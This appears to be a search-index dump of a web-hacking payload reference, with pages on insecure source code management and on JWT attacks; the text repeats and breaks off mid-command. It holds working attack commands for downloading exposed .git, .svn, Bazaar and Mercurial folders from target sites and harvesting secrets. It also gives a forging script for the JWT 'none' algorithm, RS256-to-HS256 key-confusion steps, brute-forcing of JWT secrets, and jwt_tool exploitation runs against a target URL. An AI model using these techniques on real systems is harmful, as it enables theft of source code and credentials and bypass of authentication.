way for you to find unencrypted secrets and other unwanted data types in git source code repositories. # Run gitleaks against a public repository docker run --rm --name=gitleaks zricethezav/gitleaks -v -r https://github.com/zricethezav/gitleaks.git # Run gitleaks against a local repository already cloned into /tmp/ docker run --rm --name=gitleaks -v /tmp/:/code/ zricethezav/gitleaks -v --repo-path=/code/gitleaks # Run gitleaks against a specific Github Pull request docker run --rm --name=gitleaks -e GITHUB_TOKEN={your token} zricethezav/gitleaks --github-pr=https://github.com/owner/repo/pull/9000 or go get -u github.com/zricethezav/gitleaks Subversion Example (Wordpress) curl http://blog.domain.com/.svn/text-base/wp-config.php.svn-base Download the svn database from http://server/path_to_vulnerable_site/.svn/wc.db powershell INSERT INTO \"NODES\" VALUES(1,'trunk/test.txt',0,'trunk',1,'trunk/test.txt',2,'normal',NULL,NULL,'file',X'2829',NULL,'$sha1$945a60e68acc693fcb74abadb588aac1a9135f62',NULL,2,1456056344886288,'bl4de',38,1456056261000000,NULL,NULL); Download interesting files remove \\$sha1\\$ prefix add .svn-base postfix use first byte from hash as a subdirectory of the pristine/ directory ( 94 in this case) create complete path, which will be: http://server/path_to_vulnerable_site/.svn/pristine/94/945a60e68acc693fcb74abadb588aac1a9135f62.svn-base Tools svn-extractor git clone https://github.com/anantshri/svn-extractor.git python svn-extractor.py \u2013url \"url with .svn available\" Bazaar Tools rip-bzr.pl wget https://raw.githubusercontent.com/kost/dvcs-ripper/master/rip-bzr.pl docker run --rm -it -v /path/to/host/work:/work:rw k0st/alpine-dvcs-ripper rip-bzr.pl -v -u bzr_dumper git clone https://github.com/SeahunOh/bzr_dumper python3 dumper.py -u \"http://127.0.0.1:5000/\" -o source Created a standalone tree (format: 2a) [!] Target : http://127.0.0.1:5000/ [+] Start. [+] GET repository/pack-names [+] GET README [+] GET checkout/dirstate [+] GET checkout/views [+] GET branch/branch.conf [+] GET branch/format [+] GET branch/last-revision [+] GET branch/tag [+] GET b'154411f0f33adc3ff8cfb3d34209cbd1' [*] Finish $ bzr revert N application.py N database.py N static/ Mercurial Tools rip-hg.pl wget https://raw.githubusercontent.com/kost/dvcs-ripper/master/rip-hg.pl docker run --rm -it -v /path/to/host/work:/work:rw k0st/alpine-dvcs-ripper rip-hg.pl -v -u References bl4de, hidden_directories_leaks bl4de, diggit Gitrob: Now in Go - Michael Henriksen","title":"Insecure source code management"},{"location":"Insecure%20Source%20Code%20Management/#insecure-source-code-management","text":"Git Example Recovering file contents from .git/logs/HEAD Recovering file contents from .git/index Tools Automatic recovery git-dumper.py diggit.py GoGitDumper rip-git GitHack GitTools Harvesting secrets trufflehog Yar Gitrob Gitleaks Subversion Example (Wordpress) Tools svn-extractor Bazaar Tools rip-bzr.pl bzr_dumper Mercurial Tools rip-hg.pl References","title":"Insecure source code management"},{"location":"Insecure%20Source%20Code%20Management/#git","text":"The following examples will create either a copy of the .git or a copy of the current commit. Check for the following files, if they exist you can extract the .git folder. .git/config .git/HEAD .git/logs/HEAD","title":"Git"},{"location":"Insecure%20Source%20Code%20Management/#example","text":"","title":"Example"},{"location":"Insecure%20Source%20Code%20Management/#recovering-file-contents-from-gitlogshead","text":"Check for 403 Forbidden or directory listing to find the /.git/ directory Git saves all information in .git/logs/HEAD (try lowercase head too) powershell 0000000000000000000000000000000000000000 15ca375e54f056a576905b41a417b413c57df6eb root <root@dfc2eabdf236.(none)> 1455532500 +0000 clone: from https://github.com/fermayo/hello-world-lamp.git 15ca375e54f056a576905b41a417b413c57df6eb 26e35470d38c4d6815bc4426a862d5399f04865c Michael <michael@easyctf.com> 1489390329 +0000 commit: Initial. 26e35470d38c4d6815bc4426a862d5399f04865c 6b4131bb3b84e9446218359414d636bda782d097 Michael <michael@easyctf.com> 1489390330 +0000 commit: Whoops! Remove flag. 6b4131bb3b84e9446218359414d636bda782d097 a48ee6d6ca840b9130fbaa73bbf55e9e730e4cfd Michael <michael@easyctf.com> 1489390332 +0000 commit: Prevent directory listing. Access the commit using the hash ```powershell # create an empty .git repository git init test cd test/.git","title":"Recovering file contents from .git/logs/HEAD"},{"location":"Insecure%20Source%20Code%20Management/#download-the-file","text":"wget http://web.site/.git/objects/26/e35470d38c4d6815bc4426a862d5399f04865c","title":"download the file"},{"location":"Insecure%20Source%20Code%20Management/#first-byte-for-subdirectory-remaining-bytes-for-filename","text":"mkdir .git/object/26 mv e35470d38c4d6815bc4426a862d5399f04865c .git/objects/26/","title":"first byte for subdirectory, remaining bytes for filename"},{"location":"Insecure%20Source%20Code%20Management/#display-the-file","text":"git cat-file -p 26e35470d38c4d6815bc4426a862d5399f04865c tree 323240a3983045cdc0dec2e88c1358e7998f2e39 parent 15ca375e54f056a576905b41a417b413c57df6eb author Michael michael@easyctf.com 1489390329 +0000 committer Michael michael@easyctf.com 1489390329 +0000 Initial. 4. Access the tree 323240a3983045cdc0dec2e88c1358e7998f2e39 powershell wget http://web.site/.git/objects/32/3240a3983045cdc0dec2e88c1358e7998f2e39 mkdir .git/object/32 mv 3240a3983045cdc0dec2e88c1358e7998f2e39 .git/objects/32/ git cat-file -p 323240a3983045cdc0dec2e88c1358e7998f2e39 040000 tree bd083286051cd869ee6485a3046b9935fbd127c0 css 100644 blob cb6139863967a752f3402b3975e97a84d152fd8f flag.txt 040000 tree 14032aabd85b43a058cfc7025dd4fa9dd325ea97 fonts 100644 blob a7f8a24096d81887483b5f0fa21251a7eefd0db1 index.html 040000 tree 5df8b56e2ffd07b050d6b6913c72aec44c8f39d8 js 5. Read the data (flag.txt) powershell wget http://web.site/.git/objects/cb/6139863967a752f3402b3975e97a84d152fd8f mkdir .git/object/cb mv 6139863967a752f3402b3975e97a84d152fd8f .git/objects/32/ git cat-file -p cb6139863967a752f3402b3975e97a84d152fd8f ```","title":"display the file"},{"location":"Insecure%20Source%20Code%20Management/#recovering-file-contents-from-gitindex","text":"Use the git index file parser https://pypi.python.org/pypi/gin (python3). pip3 install gin gin ~/git-repo/.git/index Recover name and sha1 hash of every file listed in the index, and use the same process above to recover the file. $ gin .git/index | egrep -e \"name|sha1\" name = AWS Amazon Bucket S3/README.md sha1 = 862a3e58d138d6809405aa062249487bee074b98 name = CRLF injection/README.md sha1 = d7ef4d77741c38b6d3806e0c6a57bf1090eec141","title":"Recovering file contents from .git/index"},{"location":"Insecure%20Source%20Code%20Management/#tools","text":"","title":"Tools"},{"location":"Insecure%20Source%20Code%20Management/#automatic-recovery","text":"","title":"Automatic recovery"},{"location":"Insecure%20Source%20Code%20Management/#git-dumperpy","text":"git clone https://github.com/arthaud/git-dumper pip install -r requirements.txt ./git-dumper.py http://web.site/.git ~/website","title":"git-dumper.py"},{"location":"Insecure%20Source%20Code%20Management/#diggitpy","text":"git clone https://github.com/bl4de/security-tools/ && cd security-tools/diggit ./diggit.py -u remote_git_repo -t temp_folder -o object_hash [-r=True] ./diggit.py -u http://web.site -t /path/to/temp/folder/ -o d60fbeed6db32865a1f01bb9e485755f085f51c1 -u is remote path, where .git folder exists -t is path to local folder with dummy Git repository and where blob content (files) are saved with their real names (cd /path/to/temp/folder && git init) -o is a hash of particular Git object to download","title":"diggit.py"},{"location":"Insecure%20Source%20Code%20Management/#gogitdumper","text":"go get github.com/c-sto/gogitdumper gogitdumper -u http://web.site/.git/ -o yourdecideddir/.git/ git log git checkout","title":"GoGitDumper"},{"location":"Insecure%20Source%20Code%20Management/#rip-git","text":"git clone https://github.com/kost/dvcs-ripper perl rip-git.pl -v -u \"http://web.site/.git/\" git cat-file -p 07603070376d63d911f608120eb4b5489b507692 tree 5dae937a49acc7c2668f5bcde2a9fd07fc382fe2 parent 15ca375e54f056a576905b41a417b413c57df6eb author Michael <michael@easyctf.com> 1489389105 +0000 committer Michael <michael@easyctf.com> 1489389105 +0000 git cat-file -p 5dae937a49acc7c2668f5bcde2a9fd07fc382fe2","title":"rip-git"},{"location":"Insecure%20Source%20Code%20Management/#githack","text":"git clone https://github.com/lijiejie/GitHack GitHack.py http://web.site/.git/","title":"GitHack"},{"location":"Insecure%20Source%20Code%20Management/#gittools","text":"git clone https://github.com/internetwache/GitTools ./gitdumper.sh http://target.tld/.git/ /tmp/destdir git checkout -- .","title":"GitTools"},{"location":"Insecure%20Source%20Code%20Management/#harvesting-secrets","text":"","title":"Harvesting secrets"},{"location":"Insecure%20Source%20Code%20Management/#trufflehog","text":"Searches through git repositories for high entropy strings and secrets, digging deep into commit history. pip install truffleHog # https://github.com/dxa4481/truffleHog truffleHog --regex --entropy=False https://github.com/dxa4481/truffleHog.git","title":"trufflehog"},{"location":"Insecure%20Source%20Code%20Management/#yar","text":"Searches through users/organizations git repositories for secrets either by regex, entropy or both. Inspired by the infamous truffleHog. go get github.com/nielsing/yar # https://github.com/nielsing/yar yar -o orgname --both","title":"Yar"},{"location":"Insecure%20Source%20Code%20Management/#gitrob","text":"Gitrob is a tool to help find potentially sensitive files pushed to public repositories on Github. Gitrob will clone repositories belonging to a user or organization down to a configurable depth and iterate through the commit history and flag files that match signatures for potentially sensitive files. go get github.com/michenriksen/gitrob # https://github.com/michenriksen/gitrob export GITROB_ACCESS_TOKEN=deadbeefdeadbeefdeadbeefdeadbeefdeadbeef gitrob [options] target [target2] ... [targetN]","title":"Gitrob"},{"location":"Insecure%20Source%20Code%20Management/#gitleaks","text":"Gitleaks provides a way for you to find unencrypted secrets and other unwanted data types in git source code repositories. # Run gitleaks against a public repository docker run --rm --name=gitleaks zricethezav/gitleaks -v -r https://github.com/zricethezav/gitleaks.git # Run gitleaks against a local repository already cloned into /tmp/ docker run --rm --name=gitleaks -v /tmp/:/code/ zricethezav/gitleaks -v --repo-path=/code/gitleaks # Run gitleaks against a specific Github Pull request docker run --rm --name=gitleaks -e GITHUB_TOKEN={your token} zricethezav/gitleaks --github-pr=https://github.com/owner/repo/pull/9000 or go get -u github.com/zricethezav/gitleaks","title":"Gitleaks"},{"location":"Insecure%20Source%20Code%20Management/#subversion","text":"","title":"Subversion"},{"location":"Insecure%20Source%20Code%20Management/#example-wordpress","text":"curl http://blog.domain.com/.svn/text-base/wp-config.php.svn-base Download the svn database from http://server/path_to_vulnerable_site/.svn/wc.db powershell INSERT INTO \"NODES\" VALUES(1,'trunk/test.txt',0,'trunk',1,'trunk/test.txt',2,'normal',NULL,NULL,'file',X'2829',NULL,'$sha1$945a60e68acc693fcb74abadb588aac1a9135f62',NULL,2,1456056344886288,'bl4de',38,1456056261000000,NULL,NULL); Download interesting files remove \\$sha1\\$ prefix add .svn-base postfix use first byte from hash as a subdirectory of the pristine/ directory ( 94 in this case) create complete path, which will be: http://server/path_to_vulnerable_site/.svn/pristine/94/945a60e68acc693fcb74abadb588aac1a9135f62.svn-base","title":"Example (Wordpress)"},{"location":"Insecure%20Source%20Code%20Management/#tools_1","text":"","title":"Tools"},{"location":"Insecure%20Source%20Code%20Management/#svn-extractor","text":"git clone https://github.com/anantshri/svn-extractor.git python svn-extractor.py \u2013url \"url with .svn available\"","title":"svn-extractor"},{"location":"Insecure%20Source%20Code%20Management/#bazaar","text":"","title":"Bazaar"},{"location":"Insecure%20Source%20Code%20Management/#tools_2","text":"","title":"Tools"},{"location":"Insecure%20Source%20Code%20Management/#rip-bzrpl","text":"wget https://raw.githubusercontent.com/kost/dvcs-ripper/master/rip-bzr.pl docker run --rm -it -v /path/to/host/work:/work:rw k0st/alpine-dvcs-ripper rip-bzr.pl -v -u","title":"rip-bzr.pl"},{"location":"Insecure%20Source%20Code%20Management/#bzr_dumper","text":"git clone https://github.com/SeahunOh/bzr_dumper python3 dumper.py -u \"http://127.0.0.1:5000/\" -o source Created a standalone tree (format: 2a) [!] Target : http://127.0.0.1:5000/ [+] Start. [+] GET repository/pack-names [+] GET README [+] GET checkout/dirstate [+] GET checkout/views [+] GET branch/branch.conf [+] GET branch/format [+] GET branch/last-revision [+] GET branch/tag [+] GET b'154411f0f33adc3ff8cfb3d34209cbd1' [*] Finish $ bzr revert N application.py N database.py N static/","title":"bzr_dumper"},{"location":"Insecure%20Source%20Code%20Management/#mercurial","text":"","title":"Mercurial"},{"location":"Insecure%20Source%20Code%20Management/#tools_3","text":"","title":"Tools"},{"location":"Insecure%20Source%20Code%20Management/#rip-hgpl","text":"wget https://raw.githubusercontent.com/kost/dvcs-ripper/master/rip-hg.pl docker run --rm -it -v /path/to/host/work:/work:rw k0st/alpine-dvcs-ripper rip-hg.pl -v -u","title":"rip-hg.pl"},{"location":"Insecure%20Source%20Code%20Management/#references","text":"bl4de, hidden_directories_leaks bl4de, diggit Gitrob: Now in Go - Michael Henriksen","title":"References"},{"location":"JSON%20Web%20Token/","text":"JWT - JSON Web Token JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact and self-contained way for securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed. Summary JWT - JSON Web Token Summary Tools JWT Format Header Payload JWT Signature - None algorithm JWT Signature - RS256 to HS256 Breaking JWT's secret JWT tool JWT cracker Hashcat CVE References Tools jwt_tool c-jwt-cracker JOSEPH - JavaScript Object Signing and Encryption Pentesting Helper JWT Format JSON Web Token : Base64(Header).Base64(Data).Base64(Signature) Example : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFtYXppbmcgSGF4eDByIiwiZXhwIjoiMTQ2NjI3MDcyMiIsImFkbWluIjp0cnVlfQ.UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY Where we can split it into 3 components separated by a dot. eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 # header eyJzdWIiOiIxMjM0[...]kbWluIjp0cnVlfQ # payload UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY # signature Header Default algorithm is \"HS256\" (HMAC SHA256 symmetric encryption). \"RS256\" is used for asymmetric purposes (RSA asymmetric encryption and private key signature). { \"typ\": \"JWT\", \"alg\": \"HS256\" } alg Param Value Digital Signature or MAC Algorithm Requirements HS256 HMAC using SHA-256 Required HS384 HMAC using SHA-384 Optional HS512 HMAC using SHA-512 Optional RS256 RSASSA-PKCS1-v1_5 using SHA-256 Recommended RS384 RSASSA-PKCS1-v1_5 using SHA-384 Optional RS512 RSASSA-PKCS1-v1_5 using SHA-512 Optional ES256 ECDSA using P-256 and SHA-256 Recommended ES384 ECDSA using P-384 and SHA-384 Optional ES512 ECDSA using P-521 and SHA-512 Optional PS256 RSASSA-PSS using SHA-256 and MGF1 with SHA-256 Optional PS384 RSASSA-PSS using SHA-384 and MGF1 with SHA-384 Optional PS512 RSASSA-PSS using SHA-512 and MGF1 with SHA-512 Optional none No digital signature or MAC performed Required Payload { \"sub\":\"1234567890\", \"name\":\"Amazing Haxx0r\", \"exp\":\"1466270722\", \"admin\":true } Claims are the predefined keys and their values: - iss: issuer of the token - exp: the expiration timestamp (reject tokens which have expired). Note: as defined in the spec, this must be in seconds. - iat: The time the JWT was issued. Can be used to determine the age of the JWT - nbf: \"not before\" is a future time when the token will become active. - jti: unique identifier for the JWT. Used to prevent the JWT from being re-used or replayed. - sub: subject of the token (rarely used) - aud: audience of the token (also rarely used) JWT Encoder \u2013 Decoder: http://jsonwebtoken.io JWT Signature - None algorithm JWT supports a None algorithm for signature. This was probably introduced to debug applications. However, this can have a severe impact on the security of the application. None algorithm variants: * none * None * NONE * nOnE To exploit this vulnerability, you just need to decode the JWT and change the algorithm used for the signature. Then you can submit your new JWT. However, this won't work unless you remove the signature Alternatively you can modify an existing JWT (be careful with the expiration time) #!/usr/bin/python3 # -*- coding: utf-8 -*- import jwt jwtToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ' decodedToken = jwt.decode(jwtToken, verify=False) # Need to decode the token before encoding with type 'None' noneEncoded = jwt.encode(decodedToken, key='', algorithm=None) print(noneEncoded.decode()) \"\"\" Output: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0. \"\"\" JWT Signature - RS256 to HS256 Because the public key can sometimes be obtained by the attacker, the attacker can modify the algorithm in the header to HS256 and then use the RSA public key to sign the data. The algorithm HS256 uses the secret key to sign and verify each message. The algorithm RS256 uses the private key to sign the message and uses the public key for authentication. import jwt public = open('public.pem', 'r').read() print public print jwt.encode({\"data\":\"test\"}, key=public, algorithm='HS256') :warning: This behavior is fixed in the python library and will return this error jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret. . You need to install the following version: pip install pyjwt==0.4.3 . Here are the steps to edit an RS256 JWT token into an HS256 Convert our public key (key.pem) into HEX with this command. powershell $ cat key.pem | xxd -p | tr -d \"\\\\n\" 2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a Generate HMAC signature by supplying our public key as ASCII hex and with our token previously edited. ```powershell $ echo -n \"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ\" | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a (stdin)= 8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0 ``` Convert signature (Hex to \"base64 URL\") powershell $ python2 -c \"exec(\\\"import base64, binascii\\nprint base64.urlsafe_b64encode(binascii.a2b_hex('8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0')).replace('=','')\\\")\" Add signature to edited payload powershell [HEADER EDITED RS256 TO HS256].[DATA EDITED].[SIGNATURE] eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ.j0IbNR62H_Im34jVJqfpubt7gjlojB-GLyYaDFiJEOA Breaking JWT's secret Encode/Decode JWT with the secret. import jwt encoded = jwt.encode({'some': 'payload'}, 'secret', algorithm='HS256') # encode with 'secret' encoded = \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE\" jwt.decode(encoded, 'Sn1f', algorithms=['HS256']) # decode with 'Sn1f' as the secret key # result {u'admin': True, u'sub': u'1234567890', u'name': u'John Doe'} JWT tool First, bruteforce the \"secret\" key used to compute the signature. git clone https://github.com/ticarpi/jwt_tool python3 -m pip install termcolor cprint pycryptodomex requests python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.1rtMXfvHSjWuH6vXBCaLLJiBghzVrLJpAQ6Dl5qD4YI -d /tmp/wordlist -C \\ \\ \\ \\ \\ \\ \\__ | | \\ |\\__ __| \\__ __| | | | \\ | | | \\ \\ | | \\ | | | __ \\ __ \\ | \\ | _ | | | | | | | | | | / \\ | | | | | | | | \\ | / \\ | | |\\ |\\ | | \\______/ \\__/ \\__| \\__| \\__| \\______/ \\______/ \\__| Version 2.2.2 \\______| @ticarpi Original JWT: [+] secret is the CORRECT key! You can tamper/fuzz the token contents (-T/-I) and sign it using: python3 jwt_tool.py [options here] -S HS256 -p \"secret\" Then edit the field inside the JSON Web Token. Current value of role is: user Please enter new value and hit ENTER > admin [1] sub = 1234567890 [2] role = admin [3] iat = 1516239022 [0] Continue to next step Please select a field number: (or 0 to Continue) > 0 Finally, finish the token by signing it with the previously retrieved \"secret\" key. Token Signing: [1] Sign token with known key [2] Strip signature from token vulnerable to CVE-2015-2951 [3] Sign with Public Key bypass vulnerability [4] Sign token with key file Please select an option from above (1-4): > 1 Please enter the known key: > secret Please enter the key length: [1] HMAC-SHA256 [2] HMAC-SHA384 [3] HMAC-SHA512 > 1 Your new forged token: [+] URL safe: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.xbUXlOQClkhXEreWmB3da_xtBsT0Kjw7truyhDwF5Ic [+] Standard: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.xbUXlOQClkhXEreWmB3da/xtBsT0Kjw7truyhDwF5Ic Recon: python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw Scanning: python3 jwt_tool.py -t https://www.ticarpi.com/ -rc \"jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test\" -M pb Exploitation: python3 jwt_tool.py -t https://www.ticarpi.com/ -rc \"jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test\" -X i -I -pc name -pv admin Fuzzing: python3 jwt_tool.py -t https://www.ticarpi.com/ -rc \"jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test\" -I -hc kid -hv custom_sqli_vectors.txt Review: python3 jwt_tool.py -t https://www.ticarpi.com/ -rc \"jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test\" -X i -I -pc name -pv admin JWT cracker git clone https://github.com/brendan-rius/c-jwt-cracker ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE Secret is \"Sn1f\" Hashcat Support added to crack JWT (JSON Web Token) with hashcat at 365MH/s on a single GTX1080 - src /hashcat -m 16500 hash.txt -a 3 -w 3 ?a?a?a?a?a?a eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMj...Fh7HgQ:secret CVE CVE-2015-2951 - The alg=none signature-bypass vulnerability CVE-2016-10555 - The RS/HS256 public key mismatch vulnerability CVE-2018-0114 - Key injection vulnerability CVE-2019-20933/CVE-2020-28637 - Blank password vulnerability CVE-2020-28042 - Null signature vulnerability References Hacking JSON Web Token (JWT) - Hate_401 WebSec CTF - Authorization Token - JWT Challenge Privilege Escalation like a Boss - October 27, 2018 - janijay007 5 Easy Steps to Understanding JSON Web Token Hacking JSON Web Tokens - From Zero To Hero Without Effort - Websecurify Blog HITBGSEC CTF 2017 - Pasty (Web) - amon (j.heng) Critical vulnerabilities in JSON Web Token libraries - March 31, 2015 - Tim McLean Learn how to use JSON Web Tokens (JWT) for Authentication - @dwylhq Simple JWT hacking - @b1ack_h00d Attacking JWT authentication - Sep 28, 2016 - Sjoerd Langkemper How to Hack a Weak JWT Implementation with a Timing Attack - Jan 7, 2017 - Tamas Polgar HACKING JSON WEB TOKENS, FROM ZERO TO HERO WITHOUT EFFORT - Thu Feb 09 2017 - @pdp Write up \u2013 JRR Token \u2013 LeHack 2019 - 07/07/2019 - LAPHAZE JWT Hacking 101 - TrustFoundry - Tyler Rosonke - December 8th, 2017 JSON Web Token Validation Bypass in Auth0 Authentication API - Ben Knight Senior Security Consultant - April 16, 2020","title":"JWT - JSON Web Token"},{"location":"JSON%20Web%20Token/#jwt-json-web-token","text":"JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact and self-contained way for securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed.","title":"JWT - JSON Web Token"},{"location":"JSON%20Web%20Token/#summary","text":"JWT - JSON Web Token Summary Tools JWT Format Header Payload JWT Signature - None algorithm JWT Signature - RS256 to HS256 Breaking JWT's secret JWT tool JWT cracker Hashcat CVE References","title":"Summary"},{"location":"JSON%20Web%20Token/#tools","text":"jwt_tool c-jwt-cracker JOSEPH - JavaScript Object Signing and Encryption Pentesting Helper","title":"Tools"},{"location":"JSON%20Web%20Token/#jwt-format","text":"JSON Web Token : Base64(Header).Base64(Data).Base64(Signature) Example : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFtYXppbmcgSGF4eDByIiwiZXhwIjoiMTQ2NjI3MDcyMiIsImFkbWluIjp0cnVlfQ.UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY Where we can split it into 3 components separated by a dot. eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 # header eyJzdWIiOiIxMjM0[...]kbWluIjp0cnVlfQ # payload UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY # signature","title":"JWT Format"},{"location":"JSON%20Web%20Token/#header","text":"Default algorithm is \"HS256\" (HMAC SHA256 symmetric encryption). \"RS256\" is used for asymmetric purposes (RSA asymmetric encryption and private key signature). { \"typ\": \"JWT\", \"alg\": \"HS256\" } alg Param Value Digital Signature or MAC Algorithm Requirements HS256 HMAC using SHA-256 Required HS384 HMAC using SHA-384 Optional HS512 HMAC using SHA-512 Optional RS256 RSASSA-PKCS1-v1_5 using SHA-256 Recommended RS384 RSASSA-PKCS1-v1_5 using SHA-384 Optional RS512 RSASSA-PKCS1-v1_5 using SHA-512 Optional ES256 ECDSA using P-256 and SHA-256 Recommended ES384 ECDSA using P-384 and SHA-384 Optional ES512 ECDSA using P-521 and SHA-512 Optional PS256 RSASSA-PSS using SHA-256 and MGF1 with SHA-256 Optional PS384 RSASSA-PSS using SHA-384 and MGF1 with SHA-384 Optional PS512 RSASSA-PSS using SHA-512 and MGF1 with SHA-512 Optional none No digital signature or MAC performed Required","title":"Header"},{"location":"JSON%20Web%20Token/#payload","text":"{ \"sub\":\"1234567890\", \"name\":\"Amazing Haxx0r\", \"exp\":\"1466270722\", \"admin\":true } Claims are the predefined keys and their values: - iss: issuer of the token - exp: the expiration timestamp (reject tokens which have expired). Note: as defined in the spec, this must be in seconds. - iat: The time the JWT was issued. Can be used to determine the age of the JWT - nbf: \"not before\" is a future time when the token will become active. - jti: unique identifier for the JWT. Used to prevent the JWT from being re-used or replayed. - sub: subject of the token (rarely used) - aud: audience of the token (also rarely used) JWT Encoder \u2013 Decoder: http://jsonwebtoken.io","title":"Payload"},{"location":"JSON%20Web%20Token/#jwt-signature-none-algorithm","text":"JWT supports a None algorithm for signature. This was probably introduced to debug applications. However, this can have a severe impact on the security of the application. None algorithm variants: * none * None * NONE * nOnE To exploit this vulnerability, you just need to decode the JWT and change the algorithm used for the signature. Then you can submit your new JWT. However, this won't work unless you remove the signature Alternatively you can modify an existing JWT (be careful with the expiration time) #!/usr/bin/python3 # -*- coding: utf-8 -*- import jwt jwtToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ' decodedToken = jwt.decode(jwtToken, verify=False) # Need to decode the token before encoding with type 'None' noneEncoded = jwt.encode(decodedToken, key='', algorithm=None) print(noneEncoded.decode()) \"\"\" Output: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0. \"\"\"","title":"JWT Signature - None algorithm"},{"location":"JSON%20Web%20Token/#jwt-signature-rs256-to-hs256","text":"Because the public key can sometimes be obtained by the attacker, the attacker can modify the algorithm in the header to HS256 and then use the RSA public key to sign the data. The algorithm HS256 uses the secret key to sign and verify each message. The algorithm RS256 uses the private key to sign the message and uses the public key for authentication. import jwt public = open('public.pem', 'r').read() print public print jwt.encode({\"data\":\"test\"}, key=public, algorithm='HS256') :warning: This behavior is fixed in the python library and will return this error jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret. . You need to install the following version: pip install pyjwt==0.4.3 . Here are the steps to edit an RS256 JWT token into an HS256 Convert our public key (key.pem) into HEX with this command. powershell $ cat key.pem | xxd -p | tr -d \"\\\\n\" 2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a Generate HMAC signature by supplying our public key as ASCII hex and with our token previously edited. ```powershell $ echo -n 